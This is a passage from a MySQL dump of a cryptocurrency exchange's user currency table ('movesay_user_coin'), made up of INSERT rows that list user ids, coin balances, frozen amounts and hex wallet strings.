  `integral` decimal(20,8) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=5142 DEFAULT CHARSET=utf8 COMMENT='用户币种表';

-- ----------------------------
-- Records of movesay_user_coin
-- ----------------------------
INSERT INTO `movesay_user_coin` VALUES ('4886', '4886', '0.00000000', '0.00000000', 'f133a5357e1176c1788dfe4bc730a2f0', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4887', '4887', '0.00000000', '0.00000000', '57024f74984e85a7580718da01c24624', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4888', '4888', '0.00000000', '0.00000000', '5ab05420664209c6e0e1d45dced80062', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4889', '4889', '0.00000000', '0.00000000', '952cdd9540fa3a251022273a418d7f6f', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4890', '4890', '0.00000000', '0.00000000', 'f8acaa5d04ef766ca5dee2dc65889b80', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4891', '4891', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4892', '4892', '0.00000000', '0.00000000', '06de8c43fb1ca8f685f4215f4195507a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4893', '4893', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4894', '4894', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4895', '4895', '0.00000000', '0.00000000', 'c7c74c7f2a807e46fb46b0ebbe7e5b4a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4896', '4896', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4897', '4897', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4898', '4898', '0.00000000', '0.00000000', '558722d47782cb4f7539a03ed31050a9', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4899', '4899', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4900', '4900', '0.00000000', '0.00000000', '776b47ae1119f79e8028a1f94fff56b7', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4901', '4901', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4902', '4902', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4903', '4903', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4904', '4904', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4905', '4905', '0.00000000', '0.00000000', '69e1b8587518bc88031a15319c12dc2a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4906', '4906', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4907', '4907', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4908', '4908', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4909', '4909', '0.00000000', '0.00000000', '9b2f8b7b0872016591c21bd95b4af654', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4910', '4910', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4911', '4911', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4912', '4912', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4913', '4913', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4914', '4914', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4915', '4915', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4916', '4916', '0.00000000', '0.00000000', '591d27017f6c35a635d66de3ef76885b', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4917', '4917', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4918', '4918', '0.00000000', '0.00000000', 'b1bcb2009005dcd3875124b71ef49368', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4919', '4919', '0.00000000', '0.00000000', '83630a79b966779b05c612f5d66f10f3', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4920', '4920', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4921', '4921', '0.00000000', '0.00000000', '58e728d6e2a5b15ca7a91a6f315761ad', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4922', '4922', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4923', '4923', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4924', '4924', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4925', '4925', '0.00000000', '0.00000000', '54ccc00fe7130e5a344a83f4420a3173', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4926', '4926', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4927', '4927', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4928', '4928', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4929', '4929', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4930', '4930', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4931', '4931', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4932', '4932', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4933', '4933', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4934', '4934', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4935', '4935', '0.00000000', '0.00000000', '0c324aa2c974ebde350bb90e1d9a7173', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4941', '4941', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4942', '4942', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4943', '4943', '100000.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '50000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4939', '4939', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4944', '4944', '84185.00000000', '0.00000000', '156ca12e05e062497eca11199a54d05a', '0.00000000', '0.00000000', '', '53500.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4945', '4945', '100000.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '50000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4946', '4946', '100000.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '50000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4947', '4947', '89500.00000000', '10500.00000000', '3ce4a62ed70e316e8c5f52e2fcf9d4b2', '0.00000000', '0.00000000', '', '50000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4948', '4948', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4949', '4949', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4950', '4950', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4951', '4951', '0.00000000', '0.00000000', '884e519a763c21dc85ad4d9aecad235b', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4952', '4952', '0.00000000', '0.00000000', '68daf8a5764f8ac316443450238ff11b', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4953', '4953', '0.00000000', '0.00000000', 'c3472606d77c3361bae9f31cc2c4eac6', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4954', '4954', '0.00000000', '0.00000000', 'aae7c1f7966f0f7ce2b28f9161373897', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4955', '4955', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4956', '4956', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4957', '4957', '0.00000000', '0.00000000', 'c8d3b19eedafc28c908b87fe3067e506', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4958', '4958', '0.00000000', '0.00000000', 'c28625b1e3e067aed4669a9a1236e587', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4959', '4959', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4960', '4960', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4961', '4961', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4962', '4962', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4963', '4963', '0.00000000', '0.00000000', '2ab0aaaae50eb8df8252ed996f96a352', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4964', '4964', '0.00000000', '0.00000000', '9087bd343ffb1b797e35f73cb996729a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4965', '4965', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4966', '4966', '5000.00000000', '0.00000000', '1e89d590053073adab3745b0fee7e9f1', '0.00000000', '0.00000000', '', '6500.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4967', '4967', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4968', '4968', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4969', '4969', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4970', '4970', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4971', '4971', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4972', '4972', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4973', '4973', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4974', '4974', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4975', '4975', '0.00000000', '0.00000000', 'b9139a0c792a3cb3b77c1f3f4ef5cb59', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4976', '4976', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4977', '4977', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4978', '4978', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4979', '4979', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4980', '4980', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4981', '4981', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4982', '4982', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4983', '4983', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4984', '4984', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4985', '4985', '0.00000000', '0.00000000', '5acddfbd3cc9b2e1a4052764aff9574e', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4986', '4986', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4987', '4987', '0.00000000', '0.00000000', '70e90311b85c72c3cc8701f6dbdabce0', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4988', '4988', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4989', '4989', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4990', '4990', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4991', '4991', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4992', '4992', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4993', '4993', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4994', '4994', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4995', '4995', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4996', '4996', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4997', '4997', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4998', '4998', '0.00000000', '0.00000000', 'b4ab22e7bee023b1a18171a42b60fdac', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('4999', '4999', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5000', '5000', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5001', '5001', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5002', '5002', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5003', '5003', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5004', '5004', '0.00000000', '0.00000000', '8ffcc22929e9b44b29eb90cfe64336ad', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5005', '5005', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5006', '5006', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5007', '5007', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5008', '5008', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5009', '5009', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5010', '5010', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5011', '5011', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5012', '5012', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5013', '5013', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5014', '5014', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5015', '5015', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5016', '5016', '0.00000000', '0.00000000', '7aea335e85a534c755dea490d8ccc6ea', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5017', '5017', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5018', '5018', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5019', '5019', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5020', '5020', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5021', '5021', '0.00000000', '0.00000000', '5e15cf2f12eb4e3c7abc26784539b7a0', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5022', '5022', '13000.00000000', '0.00000000', 'e3f0fa84dd3641a9deb581d52dee369e', '3000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5023', '5023', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5024', '5024', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5025', '5025', '0.00000000', '0.00000000', 'de49bd62f8575db868e6e3e617281b4d', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5026', '5026', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5027', '5027', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5028', '5028', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5029', '5029', '0.00000000', '0.00000000', 'c79b40ce43f2fd995a196470053798fa', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5030', '5030', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5031', '5031', '0.00000000', '0.00000000', '5c04303348ef7ba6cab7d2133bc80635', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5032', '5032', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5033', '5033', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5034', '5034', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5035', '5035', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5036', '5036', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5037', '5037', '0.00000000', '0.00000000', '0017f5ff9ca6e5dd9cd1ec1c92402d09', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5038', '5038', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5039', '5039', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5040', '5040', '3000.00000000', '0.00000000', 'ea6abd65b76a53f96a99c6e53f14e82b', '3000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5041', '5041', '10000.00000000', '0.00000000', '', '1000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5042', '5042', '10000.00000000', '0.00000000', '4bf1688bafa35f9233aa11f9622765df', '10000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5043', '5043', '98.95000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5044', '5044', '0.00000000', '0.00000000', '64ec609f89fa60f852bbcdd861ef5ae5', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5045', '5045', '8951.00000000', '1050.00000000', '17570e790b0a2cb94a1148fe33fde3d0', '10000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5046', '5046', '1000.00000000', '0.00000000', '', '1000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5047', '5047', '1000.00000000', '0.00000000', '', '1000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5048', '5048', '998862.90000000', '1115.05000000', 'e68c00655c6afc48c4a79975fa85ad96', '100000.00000000', '0.00000000', '', '3002.20000000');
INSERT INTO `movesay_user_coin` VALUES ('5049', '5049', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5050', '5050', '7900.00000000', '1050.00000000', '', '10000.00000000', '0.00000000', '', '3100.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5051', '5051', '1997.90000000', '2.10000000', '', '1000.00000000', '0.00000000', '', '3100.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5052', '5052', '0.00000000', '0.00000000', 'd125e7cae74619a33c9e91daee668f56', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5053', '5053', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5054', '5054', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5055', '5055', '0.00000000', '0.00000000', '0eb1aa2f28fd1aa038eaf4bf20500952', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5056', '5056', '0.00000000', '0.00000000', '856103b21deb878f3453c5bc9953dde5', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5057', '5057', '0.00000000', '0.00000000', '3c1062358ce1945a5253be4c1bb329ba', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5058', '5058', '9011.00000000', '0.00000000', '3ca879c65b7cd1602ea0cb61b5490c24', '100000.00000000', '0.00000000', '', '3001.20000000');
INSERT INTO `movesay_user_coin` VALUES ('5059', '5059', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5060', '5060', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5061', '5061', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5062', '5062', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5063', '5063', '0.00000000', '0.00000000', '918f958d6bbd6b02d5e6a80041f6705a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5064', '5064', '0.00000000', '0.00000000', '838780e6d81ad685417f3cc1de7fde36', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5065', '5065', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5066', '5066', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5067', '5067', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5068', '5068', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5069', '5069', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5070', '5070', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5071', '5071', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5072', '5072', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5073', '5073', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5074', '5074', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5075', '5075', '0.00000000', '0.00000000', '32700f49432b92ec07ef0c7c5d5d3bc3', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5076', '5076', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5077', '5077', '0.00000000', '0.00000000', '456d8fa5daa2fb5f929ec7f0f9ef7485', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5078', '5078', '0.00000000', '0.00000000', '1f736fff88a5a0fe7479408f6fb651e1', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5079', '5079', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5080', '5080', '0.00000000', '0.00000000', '3ea2e33b6413230cd59d6277c4320f27', '0.00000000', '0.00000000', '', '3000.00000000');
